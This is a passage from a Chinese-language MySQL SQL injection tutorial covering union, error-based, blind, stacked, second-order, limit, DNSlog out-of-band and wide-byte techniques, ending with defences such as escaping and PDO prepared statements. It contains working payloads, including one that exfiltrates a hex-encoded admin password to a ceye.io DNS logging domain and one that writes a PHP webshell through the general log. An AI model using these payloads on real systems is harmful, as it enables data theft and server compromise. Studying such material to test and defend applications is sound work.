right(&#x27;1234567890&#x27;,2) |+-----------------------+| 90 |+-----------------------+1 row in set (0.00 sec)mysql&gt; select left(&#x27;1234567890&#x27;,5);+----------------------+| left(&#x27;1234567890&#x27;,5) |+----------------------+| 12345 |+----------------------+1 row in set (0.00 sec) isnull(exp)如果exp为null返回1，否侧返回0。 123456789101112131415mysql&gt; select isnull(1+1);+-------------+| isnull(1+1) |+-------------+| 0 |+-------------+1 row in set (0.00 sec)mysql&gt; select isnull(0);+-----------+| isnull(0) |+-----------+| 0 |+-----------+1 row in set (0.00 sec) 可以配合注入来判断文件是否存在以及是否有权限读取文件。 12mysql&gt; select * from math where id=1 and updatexml(0,concat(0x7e,isnull(LOAD_FILE(&#x27;/Users/apple/Desktop/2.txt&#x27;)),0x7e),0);ERROR 1105 (HY000): XPATH syntax error: &#x27;~1~&#x27; ifnull(expr1,expr2)假如expr1不为NULL，则IFNULL()的返回值为expr1; 否则其返回值为expr2。IFNULL()的返回值是数字或是字符串。 常用符号位运算符二进制数上进行计算的运算符。位运算会先将操作数变成二进制数，进行位运算。然后再将计算结果从二进制数变回十进制数。 按位或 1234567mysql&gt; select 0|9879;+--------+| 0|9879 |+--------+| 9879 |+--------+1 row in set (0.00 sec) 按位异或 1234567mysql&gt; select 0^9879;+--------+| 0^9879 |+--------+| 9879 |+--------+1 row in set (0.00 sec) 按位与 1234567mysql&gt; select 0&amp;5464;+--------+| 0&amp;5464 |+--------+| 0 |+--------+1 row in set (0.00 sec) 0与任何的数字A按位或、异或都是A数字。 0与任何数字按位与都是0。 逻辑运算符 逻辑运算符用来判断表达式的真假。如果表达式是真，结果返回 1。如果表达式是假，结果返回 0。 与运算符 123456789101112mysql&gt; select 2 and 0;+---------+| 2 and 0 |+---------+| 0 |+---------+ mysql&gt; select 2 and 1; +---------+ | 2 and 1 | +---------+ | 1 | +---------+ 或运算符 12345678910111213mysql&gt; select 2 or 0; +--------+ | 2 or 0 | +--------+ | 1 | +--------+ mysql&gt; select 2 or 1; +--------+ | 2 or 1 | +--------+ | 1 | +--------+ 非运算符 12345678910111213mysql&gt; select not 1; +-------+ | not 1 | +-------+ | 0 | +-------+ mysql&gt; select !0; +----+ | !0 | +----+ | 1 | +----+ 注入分类联合注入原理： 联合查询是可合并多个相似的选择查询的结果集。等同于将一个表追加到另一个表，从而实现将两个表的查询组合到一起，使用谓词为union或union all。 条件： 页面有回显、有占位符 占位符： 从数据库中取出某些输入能够显示到页面上的某一个位置。 步骤： 判断是否有注入 判断是数字型注入还是字符型注入 猜测查询列数 列数小,正常回显,num大,不回显。 寻找占位 获取所有数据库名 获取指定数据的所有表名 获取指定数据库的指定数据表的所有字段名 获取指定数据库的指定数据表的所有的内容 报错注入 BIGINT等数据类型溢出 原理： 在mysql5.5之前，整形溢出是不会报错的，只有版本号大于5.5.5时，才会报错。 在mysql中要想获取BIGINT最大值，可以直接0按位置取反,超出最大值就会报错，而sql语句在执行成功的时候会返回0，取反之后就会变成1。 12345678910111213141516171819202122mysql&gt; select ~0;+----------------------+| ~0 |+----------------------+| 18446744073709551615 |+----------------------+1 row in set (0.00 sec)mysql&gt; select (select * from (select user())x);+----------------------------------+| (select * from (select user())x) |+----------------------------------+| root@localhost |+----------------------------------+1 row in set (0.00 sec)mysql&gt; select !(select * from (select user())x);+-----------------------------------+| !(select * from (select user())x) |+-----------------------------------+| 1 |+-----------------------------------+1 row in set (0.00 sec) 超出最大值就会报错： 12mysql&gt; select ~0+1;ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#39;(~(0) + 1)&#39; SQL注入利用 组合好逐位取反和逻辑取反运算，我们就能利用溢出错误来成功的注入查询。 12mysql&gt; select ~0+!(select*from(select user())x);ERROR 1690 (22003): BIGINT value is out of range in &#39;(~(0) + (not((select &#39;root@localhost&#39; from dual))))&#39; 返回0 1select*from(select user())x 返回1 1!(select*from(select user())x); 溢出 1~0+!(select*from(select user())x); 同理 1!(select*from(select user())x)-~0 1mysql&gt; select username, password from users where id&#x3D;&#39;1&#39; or !(select*from(select user())x)-~0; 注意： 当MySQL版本大于或等于5.5.53时，数据溢出注入无效。 exp()函数：当传入的数值大于709的时候就会报错。 12345678910mysql&gt; select exp(709);+-----------------------+| exp(709) |+-----------------------+| 8.218407461554972e307 |+-----------------------+1 row in set (0.00 sec)mysql&gt; select exp(710);ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(710)&#39; exp函数与整形溢出结合 mysql&gt;5.5.53时，则不能返回查询结果 12345678910mysql&gt; select version();+-----------+| version() |+-----------+| 5.7.26 |+-----------+1 row in set (0.00 sec)mysql&gt; select exp(~(select * from (select user())x));ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(~((select &#96;x&#96;.&#96;user()&#96; from (select user() AS &#96;user()&#96;) &#96;x&#96;)))&#39; mysql5.5.47可以在报错中返回查询结果 12mysql&gt; select (select(!x-~0)from(select(select user())x)a);ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#39;((not(&#96;a&#96;.&#96;x&#96;)) - ~(0))&#39; xpath语法错误 原理： mysql&gt;5.1.5，提供两个函数来修改和查询XML，updatexml用来修改文档，extractvalue用来按照xpath语法查询节点内容。 updatexml()函数 1234UPDATEXML (XMLdocument, XPathstring, new_value);第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc第二个参数：XPath_string (Xpath格式的字符串)第三个参数：new_value，String格式，替换查找到的符合条件的数据 UPDATEXML第二个参数需要Xpath格式的字符串，如果不符合就会报错。 12mysql&gt; select updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1);ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.26~&#39; extractvalue()对XML文档进行查询的函数 123ExtractValue(xml_frag, xpath_expr)第一个参数：可以传入目标xml文档第二个参数：用Xpath路径法表示的查找路径 寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误的话，就会报错。 12mysql&gt; SELECT extractvalue(&#39;22&#39;,concat(&#39;~&#39;,(select version())));ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.26&#39; 主键重复 基本函数 rand() rand()随机产生一个0～1的数字 123456789101112131415mysql&gt; select rand();+----------------------+| rand() |+----------------------+| 0.006128073675677249 |+----------------------+1 row in set (0.01 sec)mysql&gt; select rand();+---------------------+| rand() |+---------------------+| 0.33123136435750067 |+---------------------+1 row in set (0.00 sec) rand(0)产生一个固定的0～1的数字 123456789101112131415mysql&gt; select rand(0);+---------------------+| rand(0) |+---------------------+| 0.15522042769493574 |+---------------------+1 row in set (0.00 sec)mysql&gt; select rand(0);+---------------------+| rand(0) |+---------------------+| 0.15522042769493574 |+---------------------+1 row in set (0.00 sec) 有几条数据就会返回几条随机数 123456789101112131415161718192021222324252627mysql&gt; select rand() from math;+----------------------+| rand() |+----------------------+| 0.6377726314941167 || 0.1951690951317261 || 0.06252761190992558 || 0.7271308048880946 || 0.44807121944434125 || 0.058963713291067366 || 0.9506049388559581 |+----------------------+7 rows in set (0.00 sec)mysql&gt; select * from math;+------+-----------+| id | name |+------+-----------+| 1 | gongxinao || 1 | 李明 || 1 | gongxinao || 1 | gongxinao || 25 | gongcheng || 3 | chengxian || 25 | gongcheng |+------+-----------+7 rows in set (0.00 sec) floor()该函数返回X的最大整数值，但不能大于X 1234567mysql&gt; select floor(5.23);+-------------+| floor(5.23) |+-------------+| 5 |+-------------+1 row in set (0.00 sec) floor() 返回小于等于该值的最大整数,rand返回0到1.乘2自然返回0到2,加上floor自然返回0到1.所以我们基本确认要么返回0要么返回1。 floor(rand(0)*2):具有确定性 floor(rand()*2):具有不确定性 原理： count()和group by在遇到rand()产生的重复值时报错。 Select name,count(*) from student group by name 这条语句的作用就是从student表中select出name和count(count会具体返回一个数字).这个数字的多少就是根据grop by 后面的name来决定。也就是说最终他会返回姓名以及每一个姓名出现的次数。 重点是这语句具体是怎么执行的？是如何计算出我们查询的不同字段(name)的个数的？ 发现mysql遇到该语句时会建立一个虚拟表。该虚拟表有两个字段，一个是分组的 key ，一个是计数值 count(*) 在查询数据的时候，首先查看该虚拟表中是否存在该分组，如果存在那么计数值加1，不存在则新建该分组 同理我们根据floor(rand(0)*2)进行分组—–这里要注意floor(rand(0)*2)执行之后是有规律的返回0或者1。 根据之前rand的顺序—011011011,我们来梳理一下为什么会报错 第一次计算执行一次产生0,表中不存在任何数据,然后开始插入 插入的时候会进行第二次计算,所以在执行一次产生1插入 第三次计算产生1因为第二次产生了1所以本次就无需在执行一次计算,直接在原来的基础上加1就可以,不会在进行一次计算 第四次产生0,原来的表中没有0所以要进行插入操作,会再一次计算产生1.所以会再次产生一个分组,注意是产生一个分组,不是单纯的产生一个数值 此时此刻就报错了。因为我们已经有了一个1分组了。注意是有了一个1分组了。在添加一个1分组会报错。 注意： sql语句在执行之后建立虚表分两种情况： 1、表中没有对应的列，执行一次查询，一次插入，floor(rand(0)*2)会被执行两次。 2、表中有对应的列，执行一次查询，一次插入，floor(rand(0)*2)只会被执行一次。 主键重复的最少前提就是虚拟表中要有三条数据才会产生重复,也就是group by执行至少三次,也就是对应的group by的表要有至少三条数据 几何函数 geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()等函数 这些函数报错原理大多都相同，都是不满足参数需求而导致的报错。 DNSlog外带配合报错注入 作为攻击者，提交注入语句，让数据库把需要查询的值和域名拼接起来，然后发生DNS查询，我们只要能获得DNS的日志，就得到了想要的值。所以我们需要有一个自己的域名，然后在域名商处配置一条NS记录，然后我们在NS服务器上面获取DNS日志即可。用ceye.io这个平台，这个平台就集成了Dnslog的功能。 12http:&#x2F;&#x2F;127.0.0.1&#x2F;mysql.php?id&#x3D;1 union select 1,2,load_file(CONCAT(&#39;\\\\&#39;,(SELECT hex(pass) FROM test.test_user WHERE name&#x3D;&#39;admin&#39; LIMIT 1),&#39;.mysql.steady.ceye.io\\abc&#39;)) load_file函数在Linux下是无法用来做dnslog攻击的。 其实我们平常在Widnows中用共享文件的时候就会用到这种网络地址的形式 \\sss.xxx\\test\\ 这也就解释了为什么CONCAT()函数拼接了4个\\了，因为转义的原因，4个就变\\成了2个\\，目的就是利用UNC路径。 tips： 因为Linux没有UNC路径这个东西，所以当MySQL处于Linux系统中的时候，是不能使用这种方式外带数据的 1UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。 Limit注入 常用函数 limit [位置偏移量,]行数 123456789101112131415161718mysql&gt; select * from math limit 1,2;+------+-----------+| id | name |+------+-----------+| 1 | 李明 || 1 | gongxinao |+------+-----------+2 rows in set (0.00 sec)mysql&gt; select * from math limit 1,3;+------+-----------+| id | name |+------+-----------+| 1 | 李明 || 1 | gongxinao || 1 | gongxinao |+------+-----------+3 rows in set (0.00 sec) benchmark benchmark函数有两个参数，第一个是执行次数，第二个是要测试的函数或者表达式 . limit注入 注入点 1select*from math limit 1,[可控点] 1select*from math order by id desc limit 1,2 limit后面能够拼接的函数只有into和procedure。 无order by关键字 使用union联合查询 1select id from math order by id desc limit 0,1 union select username from users; 报错注入(5.0.0&lt; MySQL &lt;5.6.6版本) 1select * from math order by id desc limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); 延时注入(5.0.0&lt; MySQL &lt;5.6.6版本) 1select * from math order by id desc limit 0,1 procedure analyse(if(substring(version(),1,1)&#x3D;5,benchmark(50000000,encode(&#39;msg&#39;,&#39;by 5 second&#39;)),0),1) 只能使用BENCHMARK，而不能使用sleep 有order by关键字 无法使用union关键字，可尝试盲注或者报错 报错注入(5.0.0&lt; MySQL &lt;5.6.6版本) 1select * from math order by id desc limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); 延时注入(5.0.0&lt; MySQL &lt;5.6.6版本) 1select * from math order by id desc limit 0,1 procedure analyse(if(substring(version(),1,1)&#x3D;5,benchmark(50000000,encode(&#39;msg&#39;,&#39;by 5 second&#39;)),0),1) 只能使用BENCHMARK，而不能使用sleep 堆叠注入定义 堆叠可以理解为多个sql语句放在一起，一起执行，在mysql命令行中我们的sql语句是以分号分割的，所以我们在sql注入的时候可以考虑，是否可以进行多语句执行注入。例如在mysql中 1234567891011121314151617181920mysql&gt; select * from math;select user();+------+-----------+| id | name |+------+-----------+| 1 | gongxinao || 1 | 李明 || 1 | gongxinao || 1 | gongxinao || 25 | gongcheng || 3 | chengxian || 25 | gongcheng |+------+-----------+7 rows in set (0.00 sec)+----------------+| user() |+----------------+| root@localhost |+----------------+1 row in set (0.00 sec) 而union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。 原理： mysql_query与mysqli-&gt;multi_query() mysql_query() 函数执行一条 MySQL 查询。 mysqli_multi_query()支持多查询，多查询使用多个分号进行分隔。 利用配合日志getshell 12id&#x3D;1;set global general_log&#x3D;&#39;on&#39;;set global general_log_file&#x3D;&#39;D:\\\\wwwroot\\\\web\\\\shell.php&#39;;#id&#x3D;1;select &#39;&lt;?php phpinfo();?&gt;&#39;;# 二次注入 原理： 用户第一次输入的数据，经过各种函数处理比如addslashes或者get_magic_quotes_gpc之后，仍然被原封不动的保存在数据库中，即存入了脏数据，当程序从数据库中取出脏数据的时候，进而产生了二次注入。 实例： sqlib-24 我们需要先去注册一个用户名为admin’ #的用户，用户名存入数据库，当我们需要修改当前用户的密码的时候，我们直接输入用户名，无须输入密码即可成功修改。 程序从数据库中取出脏数据后，执行的sql语句就是 1UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;admin&#39;#&#39; and password&#x3D;&#39;$curr_pass&#39; 盲注 原理： 指的是在不知道数据库返回值的情况下对数据中的内容进行猜测，实施SQL注入。盲注一般分为布尔盲注和基于时间的盲注。 盲注分为两类： 1.布尔盲注 布尔很明显Ture跟Fales，也就是说它只会根据你的注入信息返回Ture跟Fales，也就没有了之前的报错信息。 2.时间盲注 界面返回值只有一种,true 无论输入任何值 返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确。 常用函数 IF()1IF(expr1,expr2,expr3) 如果 expr1 是TRUE (expr1 &lt;&gt; 0 and expr1 &lt;&gt; NULL)，则 IF()的返回值为expr2; 否则返回值则为 expr3。IF() 的返回值为数字值或字符串值，具体情况视其所在语境而定。 MID()MID() 函数用于从文本字段中提取字符。 SELECT MID(column_name,start[,length]) FROM table_name; 12345678910111213141516171819202122232425mysql&gt; SELECT MID(&#39;NowaMagic&#39;,1,2);+----------------------+| MID(&#39;NowaMagic&#39;,1,2) |+----------------------+| No |+----------------------+1 row in set (0.00 sec)mysql&gt; SELECT MID(&#39;NowaMagic&#39;,1,3);+----------------------+| MID(&#39;NowaMagic&#39;,1,3) |+----------------------+| Now |+----------------------+1 row in set (0.00 sec)mysql&gt; SELECT MID(&#39;NowaMagic&#39;,0,3);+----------------------+| MID(&#39;NowaMagic&#39;,0,3) |+----------------------+| |+----------------------+1 row in set (0.00 sec)mysql&gt; substr() 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263mysql&gt; SELECT substr(&#39;NowaMagic&#39;,1,3);+-------------------------+| substr(&#39;NowaMagic&#39;,1,3) |+-------------------------+| Now |+-------------------------+1 row in set (0.01 sec)mysql&gt; SELECT substr(&#39;NowaMagic&#39;,1,1);+-------------------------+| substr(&#39;NowaMagic&#39;,1,1) |+-------------------------+| N |+-------------------------+1 row in set (0.01 sec)mysql&gt; SELECT substr(&#39;NowaMagic&#39;,2,1);+-------------------------+| substr(&#39;NowaMagic&#39;,2,1) |+-------------------------+| o |+-------------------------+1 row in set (0.00 sec)mysql&gt; SELECT substr(&#39;NowaMagic&#39;,3,1);+-------------------------+| substr(&#39;NowaMagic&#39;,3,1) |+-------------------------+| w |+-------------------------+1 row in set (0.00 sec)mysql&gt; SELECT substr(&#39;NowaMagic&#39;,1,3);+-------------------------+| substr(&#39;NowaMagic&#39;,1,3) |+-------------------------+| Now |+-------------------------+1 row in set (0.00 sec)mysql&gt; SELECT substr(&#39;NowaMagic&#39;,1,2);+-------------------------+| substr(&#39;NowaMagic&#39;,1,2) |+-------------------------+| No |+-------------------------+1 row in set (0.00 sec)mysql&gt; SELECT substr(&#39;NowaMagic&#39;,0,2);+-------------------------+| substr(&#39;NowaMagic&#39;,0,2) |+-------------------------+| |+-------------------------+1 row in set (0.00 sec)mysql&gt; SELECT substr(&#39;NowaMagic&#39;,0,1);+-------------------------+| substr(&#39;NowaMagic&#39;,0,1) |+-------------------------+| |+-------------------------+1 row in set (0.00 sec) case() 1234567891011121314151617181920212223mysql&gt; select case 2 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end;+------------------------------------------------------------+| case 2 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end |+------------------------------------------------------------+| two |+------------------------------------------------------------+1 row in set (0.00 sec)mysql&gt; select case 1 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end;+------------------------------------------------------------+| case 1 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end |+------------------------------------------------------------+| one |+------------------------------------------------------------+1 row in set (0.00 sec)mysql&gt; select case 3 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end;+------------------------------------------------------------+| case 3 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end |+------------------------------------------------------------+| more |+------------------------------------------------------------+1 row in set (0.00 sec) ord()ORD() 函数返回字符串第一个字符的 ASCII 值。 ELT(N,str1,str2,str3,…)如果N =1返回str1，如果N= 2返回str2，等等。返回NULL如果参数的数量小于1或大于N。ELT()是FIELD()的补集。 123456mysql&gt; SELECT ELT(1, &#39;ej&#39;, &#39;Heja&#39;, &#39;hej&#39;, &#39;foo&#39;);+---------------------------------------------------------+| ELT(1, &#39;ej&#39;, &#39;Heja&#39;, &#39;hej&#39;, &#39;foo&#39;) |+---------------------------------------------------------+| ej |+---------------------------------------------------------+ sleep()、BENCHMARK() 笛卡尔积 原理： 1AxB&#x3D;A和B中每个元素的组合所组成的集合，就是连接表 具体的方式就是将简单的表查询不断的叠加，使之以指数倍运算量的速度增长，不断增加系统执行 sql 语句的负荷，直到产生攻击者想要的时间延迟，利用系统自带的表和字段来完成攻击。 1SELECT count(*) FROM information_schema.columns A,information_schema.columns B,information_schema.columns C; 根据数据库查询的特点，这句话的意思就是将 A B C 三个表进行笛卡尔积（全排列），并输出 最终的行数。 实例： 配合if 1select * from table where id &#x3D; 1 and (if(substr(database(),1,1)&#x3D;&#39; &#39;, select count(*) from information_schema.columns A, information_schema.columns B,information_schema.columns C, null)) Get_lock() 加锁机制 在单数据库的环境下，如果想防止多个线程操作同一个表（多个线程可能分布在不同的机器上），可以使用这种方式，取表名为key，操作前进行加锁，操作结束之后进行释放，这样在多个线程的时候，即保证了单个表的串行操作，又保证了多个不同表的并行操作。 (1)GET_LOCK有两个参数，一个是key,表示要加锁的字段，另一个是加锁失败后的等待时间(s)，一个客户端对某个字段加锁以后另一个客户端再想对这个字段加锁就会失败，然后就会等待设定好的时间 (2)当调用 RELEASE_LOCK来释放上面加的锁或客户端断线了，上面的锁才会释放，其它的客户端才能进来。 原理： 尝试对一个字段加锁 1234567mysql&gt; select get_lock(&#39;username&#39;,10); +-------------------------+| get_lock(&#39;username&#39;,10) | +-------------------------+ | 1 | +-------------------------+1 row in set (0.01 sec) 尝试开启另一个客户端 1234567mysql&gt; select get_lock(&#39;username&#39;,10);+-------------------------+| get_lock(&#39;username&#39;,10) |+-------------------------+| 0 |+-------------------------+1 row in set (10.01 sec) 实例： 对有一个字段加锁 1select * from ctf where flag &#x3D; 1 and get_lock(&#39;username&#39;,1); 再次加锁(配合if) 1select * from ctf where flag &#x3D; 1 and 1 and if(substr(database(),1,1),get_lock(&#39;username&#39;,5),null); 限制条件： 限制条件就是数据库的连接必须是持久连接，我们知道 mysql_connect() 连接数据库后开始查询，然后调用 mysql_close() 关闭与数据库的连接，也就是 web 服务器与数据库服务器连接的生命周期就是整个脚本运行的生命周期，脚本结束连接即断开，但是很明显这里我们要利用的是前一个连接对后一个连接的阻碍作用导致延时，所以这里的连接必须是持久的。在Apache+PHP搭建的环境中需要使用 mysql_pconnect函数来连接数据库。 其他盲注函数–mysql中用regexp是区分大小写的 lpad和rpad函数 lpad(sourceStr, length, newStr)，将字符串newStr填补到sourceStr左边，直到sourceStr长度达到length。 1234567mysql&gt; select lpad(1,5,2);+-------------+| lpad(1,5,2) |+-------------+| 22221 |+-------------+1 row in set (0.00 sec) 配合盲注 123456789101112131415mysql&gt; select length(lpad(1,(select length(database())),2));+-----------------------------------------------+| length(lpad(1,(select length(database())),2)) |+-----------------------------------------------+| 4 |+-----------------------------------------------+1 row in set (0.01 sec)mysql&gt; select lpad(1,(select length(database())),2);+---------------------------------------+| lpad(1,(select length(database())),2) |+---------------------------------------+| 2221 |+---------------------------------------+1 row in set (0.00 sec) like和regexp: Like: % : 匹配0个或任意多个字符 _ : 匹配任意一个字符 1234567mysql&gt; select database();+------------+| database() |+------------+| test |+------------+1 row in set (0.00 sec) 判断第一个字符是否是t 1234567mysql&gt; select database() like &#39;t%&#39;;+----------------------+| database() like &#39;t%&#39; |+----------------------+| 1 |+----------------------+1 row in set (0.01 sec) 判断前两个字符是不是te 1234567mysql&gt; select database() like &#39;te%&#39;;+-----------------------+| database() like &#39;te%&#39; |+-----------------------+| 1 |+-----------------------+1 row in set (0.00 sec) 判断是否包含es两个字符 1234567mysql&gt; select database() like &#39;%es%&#39;;+------------------------+| database() like &#39;%es%&#39; |+------------------------+| 1 |+------------------------+1 row in set (0.00 sec) 判断有几个字符 123456789101112131415mysql&gt; select database() like &#39;_____&#39;;+-------------------------+| database() like &#39;_____&#39; |+-------------------------+| 0 |+-------------------------+1 row in set (0.00 sec)mysql&gt; select database() like &#39;____&#39;;+------------------------+| database() like &#39;____&#39; |+------------------------+| 1 |+------------------------+1 row in set (0.00 sec) 判断第一个字符是否t 1234567mysql&gt; select database() like &#39;t___&#39;;+------------------------+| database() like &#39;t___&#39; |+------------------------+| 1 |+------------------------+1 row in set (0.00 sec) like配合盲注 123456789101112131415mysql&gt; select * from math where id &#x3D;1 and if((select database() like &#39;t___&#39;),1,0);+------+-----------+| id | name |+------+-----------+| 1 | gongxinao || 1 | 李明 || 1 | gongxinao || 1 | gongxinao || 1 | 444 || 1 | 444 |+------+-----------+6 rows in set (0.02 sec)mysql&gt; select * from math where id &#x3D;1 and if((select database() like &#39;s___&#39;),1,0);Empty set (0.00 sec) 注意点就是如果匹配成功就会返回1否则就是0。 REGEXP: 盲注值正则表达式攻击(^、&amp;) 1234567891011121314151617181920212223242526272829303132333435363738mysql&gt; select name from math where id&#x3D;3;+-----------+| name |+-----------+| chengxian |+-----------+1 row in set (0.01 sec)mysql&gt; select (select name from math where id&#x3D;3) regexp&#39;^c&#39;;+-----------------------------------------------+| (select name from math where id&#x3D;3) regexp&#39;^c&#39; |+-----------------------------------------------+| 1 |+-----------------------------------------------+1 row in set (0.01 sec)mysql&gt; select (select name from math where id&#x3D;3) regexp&#39;^s&#39;;+-----------------------------------------------+| (select name from math where id&#x3D;3) regexp&#39;^s&#39; |+-----------------------------------------------+| 0 |+-----------------------------------------------+1 row in set (0.00 sec)mysql&gt; select (select name from math where id&#x3D;3) regexp&#39;n$&#39;;+-----------------------------------------------+| (select name from math where id&#x3D;3) regexp&#39;n$&#39; |+-----------------------------------------------+| 1 |+-----------------------------------------------+1 row in set (0.00 sec)mysql&gt; select (select name from math where id&#x3D;3) regexp&#39;an$&#39;;+------------------------------------------------+| (select name from math where id&#x3D;3) regexp&#39;an$&#39; |+------------------------------------------------+| 1 |+------------------------------------------------+1 row in set (0.00 sec) 123regexp &#39;^[a-z]&#39; #判断一个表的第一个字符串是否在a-z中regexp &#39;^r&#39; #判断第一个字符串是否为rregexp &#39;^r[a-z]&#39; #判断一个表的第二个字符串是否在a-z中(这里可以使用二分法) 提高盲注速度 DNSlog+盲注 https://wooyun.js.org/drops/%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E4%B8%AD%E4%BD%BF%E7%94%A8DNS%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE.html 原理： Dnslog就是存储在DNS Server上的域名信息，它记录着用户对域名www.test.com、t00ls.com.等的访问信息。 通过合适的sql语句，在数据库中执行之后，一条带有数据库查询结果的域名就被提交到DNS服务器进行解析。 可以查看DNS服务器上的Dnslog就可以得到SQL注入结果。http://ceye.io上我们可以获取到有关`ceye.io`的DNS查询信息。 在域名解析的过程中，是由顶级域名向下逐级解析的，我们构造的攻击语句也是如此，当它发现域名中存在ceye.io时，它会将这条域名信息转到相应的NS服务器上，而通过http://ceye.io我们就可以查询到这条DNS解析记录。 Microsoft SQL Server 123使用Microsoft Windows通用命名约定（UNC）的文件和目录路径格式利用任何以下扩展存储程序引发DNS地址解析。UNC命名被应用于在局域网中访问文件服务器或者打印机，Windows系统的UNC语法具有通用的形式： \\\\ComputerName\\SharedFolder\\Resource攻击者能够通过使用自定义制作的地址作为计算机名字段的值引发DNS请求。 条件： 1、secure_file_priv为空 2、目标系统是windows，能够使用UNC路径 实例： 构造sql语句 1SELECT LOAD_FILE(CONCAT(&#39;\\\\\\\\&#39;,(select database(),&#39;mysql.cmr1ua.ceye.io\\\\abc&#39;))) 四个\\，其中两个用来转义。DNSlog平台接受信息 宽字节注入造成宽字节注入的原因是编码转换，应用程序的编码与数据库的编码不一致，编码转换导致的引号逃逸。 GBK双字节编码：一个汉字用两个字节表示，首字节对应0x81-0xFE，尾字节对应0x40-0xFE（除0x7F），刚好涵盖了对应的编码0x5C。 比如客户端php的编码为UTF-8，而mysql通过set name ‘GBK’设置编码，导致两者的编码不一样，在进行编码转换的时候出现了宽字节注入。 应用程序的编码 以php为例子，使用者输入数据后，会通过php的默认编码生成sql语句发送给服务器。在php没有开启default_charset编码时，php的默认编码为空， 123; PHP&#39;s built-in default is text&#x2F;htmldefault_mimetype &#x3D; &quot;text&#x2F;html&quot;;default_charset &#x3D; &quot;iso-8859-1&quot; 此时php会根据数据库中的编码自动来确定使用那种编码，可以使用&lt;?php $m=&quot;字&quot;; echo strlen($m);?&gt; 来进行判断，如果输出的值是3说明是utf-8编码。如果输出的值是2说明是gbk编码； SET NAMES &#39;GBK&#39;语句与这三个语句等价： 123mysql&gt;SET character_set_client &#x3D;&#39;GBK&#39;;mysql&gt;SET character_set_results &#x3D;&#39;GBK&#39;;mysql&gt;SET character_set_connection &#x3D;&#39;GBK&#39;; 三个语句的作用是： 当我们的mysql接受到客户端的数据后，会认为他的编码是character_set_client，然后会将之将换成character_set_connection的编码，然后进入具体表和字段后，再转换成字段对应的编码。 当查询结果产生后，会从表和字段的编码，转换成character_set_results编码，返回给客户端。 使用addslashes函数或是开启PHPGPC（注：在php5.4已上已给删除，并且需要说明特别说明一点，GPC无法过滤$_SERVER提交的参数）时过滤GET、POST、COOKIE、REQUSET 提交的参数时，我们使用的预定义字符会给转义成添加反斜杠的字符串如下面的例子 123单引号（&#39;）&#x3D; （\\&#39;）双引号（&quot;） &#x3D; （\\&quot;）反斜杠（\\） &#x3D; （\\\\） 比如我们输入 1id&#x3D;%df%27 会被进行如下转换 %df%27===(addslashes)===&gt;%df%5c%27===(数据库GBK)===&gt;運’ 因为数据库设置了GBK编马，即是在汉字编码范围内两个字节都会给重新编码为一个汉字。即是%df%5c转换成了汉字運，而单引号就逃逸了出来，从而造成了注入漏洞。 防御： 对于宽字节编码，有一种最好的修补就是： （1）使用mysql_set_charset(GBK)指定字符集 （2）使用mysql_real_escape_string进行转义 1原理是，mysql_real_escape_string与addslashes的不同之处在于其会考虑当前设置的字符集，不会出现前面%df和5c拼接为一个宽字节的问题，就是使用mysql_set_charset进行指定，他会指定当前连接的字符集。 （3）character_set_client设置成binary，就不存在宽字节或多字节的问题了，所有数据以二进制的形式传递，就能有效避免宽字符注入。 PDO技术mysql的预编译 当采用预编译操作时，首先将待执行的SQL，语句中的参数值用占位符替代。当带着占位符的SQL语句模板被数据库编译、解析后，再通过向占位符绑定参数进行查询操作。 模拟预处理 模拟预编译是防止某些数据库不支持预编译而设置的(如sqllite与低版本mysql)。如果模拟预处理开启，那么客户端程序内部会模拟mysql数据库中的参数绑定这一过程。也就是说，程序会在内部模拟prepare的过程，当执行execute时，再将拼接后的完整SQL语句发送给mysql数据库执行 模拟预处理并没有实现SQL模板与参数的分离，但的确可以防止sql注入。模拟预处理防止sql注入的本质是在参数绑定过程中对参数值进行转义与过滤,这一点与真正的sql数据库预处理是不一样的。理论上，sql数据库预编译更加安全一些。 非模拟预处理 1234567891011121314PDO::ATTR_EMULATE_PREPARES =&gt; false&lt;?php$params = [ PDO::ATTR_ERRMODE =&gt; PDO::ERRMODE_EXCEPTION, PDO::ATTR_EMULATE_PREPARES =&gt; false,];$db = new PDO(&#x27;mysql:dbname=cat;host=127.0.0.1;&#x27;, &#x27;root&#x27;, &#x27;root&#x27;, $params);try &#123; $link = $db-&gt;prepare(&#x27;SELECT * FROM table2 WHERE id in (:where_id, updatexml(0,concat(0xa,user()),0))&#x27;);&#125; catch (\\PDOException $e) &#123; var_dump($e);&#125; 可以看到这里使用非模拟预编，非模拟预编译不会像模拟预编呢样在PDO内部会模拟参数绑定的过程， 非模拟预处理的情况下，参数化绑定过程分两步：第一步是prepare阶段，发送带有占位符的sql语句到mysql服务器（parsing-&gt;resolution），第二步是多次发送占位符参数给mysql服务器进行执行（多次执行optimization-&gt;execution）。 在发送带有占位符的sql语句到数据库的时候这时候就已经发生了错误。进行了报错。 预编译可以完全杜绝注入攻击吗 